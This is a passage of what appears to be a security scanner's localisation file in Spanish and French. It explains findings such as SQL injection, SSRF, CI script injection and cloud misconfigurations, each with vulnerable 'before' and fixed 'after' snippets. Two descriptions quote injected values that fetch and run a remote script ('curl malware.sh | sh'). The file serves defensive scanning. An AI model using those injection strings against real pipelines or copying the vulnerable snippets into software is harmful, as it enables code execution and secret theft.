      'El workflow usa una acción de terceros referenciada por tag o rama (p. ej. "@v1", "@main") en vez de por commit SHA. Quien la mantiene — o quien compromete su cuenta — puede mover esa referencia a un commit distinto en cualquier momento, cambiando silenciosamente lo que se ejecuta en la CI, con acceso a sus secretos. Un commit SHA siempre apunta exactamente al mismo código.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, fijada al commit SHA — actualiza el SHA cuando actualices la versión`,
    },
  },
  "gha-excessive-permissions": {
    title: "El workflow se concede todos los permisos del token en vez de solo los que usa",
    description:
      '"permissions: write-all" concede al GITHUB_TOKEN del workflow acceso de escritura a todo — issues, pull requests, paquetes, despliegues — aunque el workflow solo use una parte. Si un paso del workflow se ve comprometido (una dependencia maliciosa, un script inyectado), esos permisos más amplios aumentan lo que puede hacer quien lo explota.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # solo los permisos que el workflow realmente usa`,
    },
  },
  "insecure-cookie-flags": {
    title: "Una cookie de sesión o autenticación se establece sin los flags Secure y HttpOnly",
    description:
      'Una cookie con un nombre parecido a sesión/autenticación/token se establece sin "httpOnly" y "secure" entre sus opciones. Sin httpOnly, el JavaScript de la página — incluido código inyectado vía XSS — puede leer esa cookie. Sin secure, también puede enviarse por una conexión HTTP sin cifrar.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "no-login-rate-limit": {
    title: "El formulario de acceso no bloquea demasiados intentos seguidos",
    description:
      "Una ruta de login está definida en el archivo, pero no hay rastro de un middleware de rate limiting en ese mismo archivo. Sin un límite de intentos, un atacante puede probar contraseñas en secuencia (fuerza bruta) sin que nada lo frene.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Contraseñas o datos sensibles terminan en los logs",
    description:
      "Una llamada a console.log (o similar) incluye una variable llamada password, token, secret o apiKey. Si estos logs terminan en un servicio externo o en un archivo, los datos sensibles quedan expuestos mucho más tiempo del necesario.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'La imagen base del Dockerfile usa la etiqueta ":latest"',
    description:
      'Una instrucción FROM usa explícitamente la etiqueta ":latest" en vez de una versión precisa. "latest" cambia con el tiempo: la misma build, rehecha en otro momento, puede obtener una versión distinta de la imagen base — una build no reproducible, y una actualización no deseada puede llegar sin que nadie haya decidido que así fuera.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "El Dockerfile descarga un archivo remoto con ADD en vez de COPY",
    description:
      "Una instrucción ADD con una URL http/https descarga un archivo de internet durante la build, sin comprobación de integridad y con el contenido invisible en el repositorio. Si esa URL se ve comprometida en el futuro, la build incorpora contenido arbitrario sin que nadie se dé cuenta con solo leer el Dockerfile.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<hash esperado>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Dependencia vulnerable:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Todavía no se conoce ninguna versión corregida — valora un paquete alternativo o sigue las actualizaciones del proyecto."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'Un valor controlado por un usuario externo pasa por una segunda shell en el pipeline de GitLab CI',
      description: 'Una línea de "script:" (o "before_script:"/"after_script:") usa "eval" o "sh -c"/"bash -c" junto con una variable predefinida de GitLab como el título de la merge request, el mensaje de commit o el nombre de la rama — todas modificables por cualquiera que abra una merge request, incluso desde un fork externo. El valor se expande una primera vez en la shell externa y luego se pega dentro de una cadena que la segunda shell interpreta de nuevo como código: un título como "$(curl malware.sh | sh)" ejecutaría comandos arbitrarios en el pipeline, con acceso a todos los secretos disponibles en ese job.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # pasado como argumento al comando, nunca dentro de una cadena "bash -c" que lo reinterpretaría`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker en el pipeline de GitLab CI corre con el cifrado TLS desactivado',
      description: 'El job usa el servicio "docker:dind" (Docker-in-Docker, necesario para construir imágenes dentro del pipeline) pero pone "DOCKER_TLS_CERTDIR" en una cadena vacía, desactivando por completo el cifrado TLS entre el cliente Docker y el demonio dind. Sin TLS, cualquiera que pueda alcanzar ese puerto en la misma red interna del runner puede controlar el demonio Docker — que corre con privilegios extendidos — en vez de limitarse al job que debería usarlo.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS activo entre el cliente Docker y el demonio dind — "" lo desactiva por completo`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'La imagen Docker del pipeline de GitLab CI no está fijada a una versión concreta',
      description: 'Un "image:" del pipeline apunta a una imagen sin etiqueta (equivale a ":latest") o explícitamente a ":latest". Quien mantiene esa imagen puede reemplazar su contenido en cualquier momento sin que el repositorio cambie — el mismo pipeline puede empezar a usar código distinto de un día para otro, un riesgo de cadena de suministro conceptualmente idéntico a una GitHub Action referenciada por etiqueta en vez de por commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # una etiqueta concreta (o mejor aún un digest "node@sha256:...") en vez de "latest"`,
      },
    },
},
  fr: {
  "supabase-service-role-in-client": {
    title: "La clé secrète de Supabase se retrouve dans une partie exposée au navigateur",
    description:
      "Une variable avec un préfixe public (ex. NEXT_PUBLIC_, VITE_) ou un fichier côté client référence la service role key de Supabase. Cette clé contourne la Row Level Security : si elle se retrouve dans le bundle du navigateur, n'importe qui peut la lire et agir comme administrateur de la base de données.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (serveur uniquement)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Des mots de passe ou des clés secrètes sont écrits directement dans le code",
    description:
      "Une clé API, un token ou un mot de passe semblent écrits comme valeur littérale au lieu d'être lus depuis une variable d'environnement. Quiconque lit le code source (ou le dépôt, s'il est public) récupère ce secret.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Un fichier contenant les vrais mots de passe du projet fait partie des fichiers analysés",
    description:
      "Un fichier .env avec des valeurs réelles (pas un .env.example) est inclus dans l'analyse. Si ce fichier se retrouve dans un dépôt ou un déploiement public, toutes les informations d'identification qu'il contient sont exposées.",
    fix: {
      before: `# .env (committé par erreur)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (committé)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env reste hors du dépôt (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "N'importe qui peut lire ou modifier les données de tous les utilisateurs",
    description:
      "La Row Level Security est désactivée, ou une policy autorise l'accès à tout le monde (USING (true)) sans vérifier qui fait la demande. Chaque utilisateur authentifié — ou même anonyme — peut lire ou modifier les données de tous les autres.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Une valeur saisie par l'utilisateur est collée directement dans une requête à la base de données",
    description:
      "Une requête SQL est construite en concaténant ou en interpolant directement une chaîne au lieu d'utiliser des paramètres. Si ce texte provient (même indirectement) d'un utilisateur, il peut altérer la requête elle-même — injection SQL.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Les mots de passe ne semblent pas être protégés",
    description:
      "Un champ mot de passe est enregistré exactement tel qu'il est arrivé dans la requête, et aucune fonction de hachage (bcrypt, argon2, scrypt) n'apparaît dans le fichier. Si la base de données est compromise, chaque mot de passe est immédiatement utilisable.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Le secret utilisé pour signer les connexions est écrit en clair dans le code",
    description:
      "Le secret passé à jwt.sign / jwt.verify (ou la variable JWT_SECRET) est une valeur littérale dans le code au lieu de provenir d'une variable d'environnement. Quiconque le lit peut créer des tokens d'accès valides pour n'importe quel utilisateur.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Le serveur peut être forcé à exécuter des commandes externes",
    description:
      "Une fonction qui exécute des commandes système (exec, execSync, spawn) reçoit une chaîne construite par interpolation ou concaténation. Si une partie de cette chaîne provient d'une saisie utilisateur, quiconque la contrôle peut exécuter des commandes arbitraires sur le serveur.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "Une nouvelle table semble être créée sans protection",
    description:
      "Une migration SQL crée une table mais n'active pas la Row Level Security pour cette même table dans le même fichier. Tant que cela reste ainsi, la table démarre sans aucune restriction sur qui peut la lire ou y écrire.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Le site accepte les requêtes depuis n'importe quel autre site",
    description:
      "L'en-tête CORS est configuré pour accepter les requêtes depuis n'importe quelle origine (*), ou le middleware cors() est utilisé sans restriction. N'importe quel site tiers peut appeler vos API depuis le navigateur d'un utilisateur déjà authentifié.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "Une fonction avec des permissions d'administrateur ne vérifie pas qui l'utilise",
    description:
      "Une route ou une fonction dont le nom suggère des opérations d'administration ne contient, dans les lignes voisines, aucune vérification d'authentification ou de rôle. N'importe qui connaissant l'URL pourrait l'exécuter.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Le site peut être forcé à exécuter du code externe",
    description:
      "Une requête HTTP sortante (fetch, axios) utilise directement une valeur provenant de la requête d'un utilisateur comme URL de destination. Un utilisateur malveillant peut forcer votre serveur à appeler des adresses internes ou arbitraires — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Les mots de passe sont protégés par une méthode désormais facile à casser",
    description:
      "Sur la même ligne, md5() ou sha1() sont appliqués à une valeur liée à un mot de passe. Ces algorithmes sont trop rapides à calculer : un attaquant disposant de la base de données peut essayer des milliards de mots de passe par seconde.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Un texte écrit par les utilisateurs pourrait exécuter du code dans le navigateur",
    description:
      "Du contenu est inséré dans la page en tant que HTML brut (dangerouslySetInnerHTML, v-html, .innerHTML) au lieu de texte brut. Si ce contenu inclut une saisie utilisateur, il peut contenir des scripts qui s'exécutent dans le navigateur de celui qui lit la page.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// ou, si du HTML est nécessaire : DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "L'espace de stockage des fichiers envoyés est visible par tout le monde",
    description:
      "Un bucket de stockage (Supabase Storage, S3) est configuré comme public. S'il contient des documents, des photos ou des fichiers envoyés par les utilisateurs, quiconque connaît — ou devine — le chemin peut y accéder sans authentification.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servir les fichiers avec des URLs signées à durée limitée : createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "Un simple lien suffit pour supprimer ou modifier des données",
    description:
      "Une route GET effectue une opération qui modifie des données (le chemin contient delete/remove/update/edit). Les requêtes GET s'exécutent juste en visitant un lien ou en chargeant une image depuis un site externe — le tremplin classique d'une attaque CSRF.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Les données de connexion enregistrées dans le navigateur ne sont pas bien protégées",
    description:
      "Un token d'accès est enregistré dans localStorage. Contrairement à un cookie httpOnly, n'importe quel script exécuté sur la page (y compris un script malveillant injecté via XSS) peut le lire et le voler.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// définir le token comme cookie httpOnly depuis le serveur :\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Le site peut être utilisé pour rediriger vers un site frauduleux",
    description:
      "Le site redirige l'utilisateur vers une adresse prise directement dans la requête (query, body, params) sans vérifier qu'il s'agit d'un domaine connu. Un lien qui semble pointer vers votre site peut en réalité mener vers une page de phishing.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Changer un numéro dans l'adresse pourrait afficher les données de quelqu'un d'autre",
    description:
      "Une requête à la base de données utilise directement un identifiant pris dans l'URL (req.params.id) sans vérifier, dans les lignes voisines, qu'il appartient à l'utilisateur effectuant la requête. Changer l'id dans l'adresse pourrait donner accès aux données d'un autre utilisateur — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Le formulaire de connexion ne bloque pas trop de tentatives d'affilée",
    description:
      "Une route de connexion est définie dans le fichier, mais aucune trace d'un middleware de limitation de débit dans le même fichier. Sans limite sur les tentatives, un attaquant peut essayer des mots de passe en séquence (force brute) sans être ralenti.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Des mots de passe ou des données sensibles se retrouvent dans les logs",
    description:
      "Un appel à console.log (ou similaire) inclut une variable nommée password, token, secret ou apiKey. Si ces logs se retrouvent dans un service externe ou un fichier, les données sensibles restent exposées bien plus longtemps que nécessaire.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "Un fichier sur le serveur peut être lu ou écrit en choisissant le chemin depuis l'extérieur",
    description:
      "Une fonction qui lit, écrit ou envoie un fichier reçoit le chemin directement depuis une valeur de la requête (query, body, params) sans vérifier qu'il reste dans un dossier autorisé. Un attaquant peut insérer \"../\" pour sortir du dossier prévu et lire ou écraser des fichiers arbitraires sur le serveur (ex. un fichier de configuration contenant des identifiants).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Chemin non autorisé")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Une valeur saisie par l'utilisateur est exécutée comme du code dans une requête MongoDB",
    description:
      "L'opérateur $where de MongoDB exécute du JavaScript côté serveur pour chaque document — si cette chaîne est construite en concaténant une valeur provenant de l'utilisateur, celui qui la contrôle peut faire exécuter du code arbitraire dans le contexte de la base de données, pas seulement altérer le filtre comme avec une injection SQL classique.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Une valeur saisie par l'utilisateur est interprétée comme un template, pas comme une donnée",
    description:
      "Une fonction qui compile/exécute un template reçoit le template ENTIER depuis une valeur de la requête, au lieu d'utiliser un template fixe et de ne passer que les données. Un attaquant peut écrire directement dans la syntaxe du moteur de template (ex. {{7*7}} pour Jinja2) et exécuter du code sur le serveur — Server-Side Template Injection, qui mène souvent à l'exécution de commandes arbitraires, pas seulement à un problème d'affichage comme le XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "L'analyseur XML peut être forcé à lire des fichiers ou à effectuer des requêtes externes",
    description:
      "Un analyseur XML (DocumentBuilderFactory) est créé sans désactiver explicitement les entités externes (DOCTYPE) dans les lignes voisines. Si l'analyseur reçoit du XML provenant d'une source non fiable, un attaquant peut définir une entité externe pour lire des fichiers sur le serveur ou le forcer à contacter une adresse de son choix — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Un security group Terraform ouvre un port sensible à tout internet",
    description:
      "Une règle avec \"cidr_blocks\" incluant 0.0.0.0/0 (n'importe quelle adresse IP) est proche d'un port sensible — SSH (22), RDP (3389), ou un port de base de données typique (MySQL, Postgres, MongoDB, Redis, SQL Server). N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Une règle de pare-feu Google Cloud ouvre un port sensible à tout internet",
    description:
      "Une ressource \"google_compute_firewall\" avec \"source_ranges\" incluant 0.0.0.0/0 (n'importe quelle adresse IP) autorise le trafic vers un port sensible — SSH (22), RDP (3389), ou un port de base de données typique (MySQL, Postgres, MongoDB, Redis, SQL Server). N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Une règle réseau Azure ouvre un port sensible à tout internet",
    description:
      "Une règle de sécurité réseau (\"azurerm_network_security_rule\", ou un bloc \"security_rule\" à l'intérieur de \"azurerm_network_security_group\") avec \"source_address_prefix\" à \"*\" ou \"0.0.0.0/0\", direction \"Inbound\" et accès \"Allow\", proche d'un port sensible — SSH (22), RDP (3389), ou un port de base de données typique. N'importe qui sur internet peut essayer de se connecter à ce service, pas seulement qui le devrait.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # seulement votre réseau privé, ou un bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Un secret est écrit comme valeur par défaut d'une variable Terraform",
    description:
      "Une variable avec un nom du type password/secret/token/key a une valeur littérale dans son \"default\". Contrairement à une valeur passée à l'exécution (tfvars, variables d'environnement TF_VAR_*), une valeur par défaut se retrouve dans le code source — et si le dépôt est partagé ou public, n'importe qui la voit, même sans accès à l'état Terraform.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # pas de valeur par défaut : à passer via un fichier .tfvars (hors de git) ou une variable d'environnement TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Une valeur contrôlée par un utilisateur externe entre directement dans une commande shell de la CI",
    description:
      'Une commande "run:" d\'un workflow GitHub Actions interpole directement une valeur comme le titre d\'une pull request, le nom d\'une branche ou le texte d\'un commentaire — toutes modifiables par quiconque ouvre une pull request ou un commentaire, même depuis un fork externe. Une valeur comme `"; curl malware.sh | sh #` exécuterait des commandes arbitraires dans la CI, avec accès à tous les secrets disponibles dans ce workflow.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # passé comme variable d'environnement, jamais interpolé directement dans la commande`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Le workflow exécute le code d'une pull request externe avec accès aux secrets du dépôt",
    description:
      'Le workflow utilise "pull_request_target" — qui s\'exécute avec les permissions et les secrets du dépôt de base même pour une pull request ouverte depuis un fork externe — et fait le checkout du code de la pull request elle-même ("github.event.pull_request.head"), pas de la branche de base. Celui qui ouvre la pull request obtient de fait l\'exécution de son propre code avec accès à ces secrets.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Fait le checkout de la branche de base, pas du code de la PR — ou\n      # utilisez "pull_request" au lieu de "pull_request_target" si vous\n      # n'avez pas besoin des permissions/secrets plus larges.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Les données de la requête sont désérialisées avec un format pouvant exécuter du code",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) ou la bibliothèque node-serialize (Node) désérialisent une valeur prise directement dans la requête. Contrairement à JSON, ces formats peuvent représenter et exécuter du code pendant la désérialisation elle-même — celui qui contrôle la valeur envoyée peut obtenir l'exécution de code arbitraire sur le serveur.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON n'exécute jamais de code lors du parsing, contrairement à pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Le code accepte explicitement des tokens JWT non signés (algorithme "none")',
    description:
      '"none" figure parmi les algorithmes acceptés pour vérifier un token JWT. Un token avec l\'algorithme "none" n\'a aucune signature à vérifier : n\'importe qui peut en construire un avec n\'importe quel contenu (ex. un rôle administrateur) et le code l\'accepterait comme valide.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // ne jamais inclure "none" parmi les algorithmes acceptés`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access est désactivé sur un bucket S3 défini en Terraform",
    description:
      'Une ou plusieurs des quatre protections de "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) sont réglées sur false. Cela ne signifie pas que le bucket est déjà public, mais cela retire un filet de sécurité qui empêcherait de le rendre public par erreur plus tard.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Une policy IAM définie en Terraform accorde un accès complet",
    description:
      'Un statement avec action "*" et resource "*" accorde un accès complet à chaque service et ressource AWS — la même vérification déjà faite sur l\'état IAM en direct, ici lue directement depuis le code avant même d\'être appliquée. Cela peut être voulu pour un rôle d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que les permissions réellement nécessaires.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::votre-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Un bucket Google Cloud Storage est rendu lisible par n'importe qui",
    description:
      'Une ressource "google_storage_bucket_iam_member" ou "google_storage_bucket_iam_binding" accorde un rôle à "allUsers" ou "allAuthenticatedUsers" — le premier rend le bucket lisible par n\'importe qui sur internet, même sans compte Google ; le second par quiconque possède un compte Google, pas seulement qui devrait y avoir accès.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:quelquun@example.com"  # seulement qui doit vraiment y avoir accès, pas allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "L'accès public aux blobs est activé sur un compte de stockage Azure",
    description:
      '"allow_blob_public_access" est réglé sur true sur un "azurerm_storage_account" : quiconque connaît l\'URL d\'un blob/conteneur rendu public peut le lire, sans aucune authentification.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Un rôle IAM Google Cloud accorde un accès complet (Owner/Editor)",
    description:
      'Un "google_project_iam_binding"/"google_project_iam_member" (ou l\'équivalent au niveau organisation/dossier) attribue le rôle primitif "roles/owner" ou "roles/editor" — un accès quasi complet à chaque service du projet. Cela peut être voulu pour un compte d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que les rôles prédéfinis plus spécifiques réellement nécessaires.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # seulement le rôle prédéfini réellement nécessaire, pas roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Une attribution de rôle Azure accorde un accès complet (Owner)",
    description:
      'Un "azurerm_role_assignment" attribue le rôle "Owner" — un accès complet, y compris le contrôle sur les permissions des autres utilisateurs, sur toute la portée assignée (abonnement, groupe de ressources...). Cela peut être voulu pour un compte d\'urgence, mais cela doit être confirmé : pour un usage quotidien, n\'accordez que le rôle le plus spécifique réellement nécessaire (ex. "Contributor" sur un seul groupe de ressources).',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # seulement le rôle le plus spécifique réellement nécessaire, pas Owner sur tout l'abonnement\n}`,
    },
  },
  "weak-random-token": {
    title: "Un token de sécurité est généré avec un générateur de nombres aléatoires non sécurisé",
    description:
      "Une valeur avec un nom du type token/session/reset/otp/csrf est générée avec Math.random() (JS), random.random() (Python) ou rand() (PHP) — des générateurs non conçus pour la sécurité, dont les séquences sont prévisibles. Un token généré ainsi peut être deviné ou reconstruit, annulant l'objectif pour lequel il existe (ex. un lien de réinitialisation de mot de passe que n'importe qui pourrait prédire).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, pas Math.random — imprévisible`,
    },
  },
  "ldap-injection": {
    title: "Un filtre LDAP est construit en concaténant directement une valeur de la requête",
    description:
